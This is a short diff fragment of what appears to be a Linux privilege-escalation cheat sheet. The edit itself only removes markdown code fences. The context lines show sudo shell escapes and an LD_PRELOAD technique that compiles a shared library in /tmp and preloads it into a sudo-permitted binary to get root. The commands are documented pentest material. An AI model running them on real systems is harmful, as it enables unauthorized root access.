@@ -24,7 +24,6 @@ sudo env /bin/sh
 sudo -u '<Username>' /bin/bash
 
 ## LD_PRELOAD kept
-```
 cat > /tmp/pe.c <<'EOF'
 #include <stdlib.h>
 #include <unistd.h>
@@ -36,7 +35,6 @@ void _init() {
 }
 EOF
 gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
-```
 Then any program sudo -l allows, with the library in front:
 sudo LD_PRELOAD=/tmp/pe.so /usr/bin/find
 
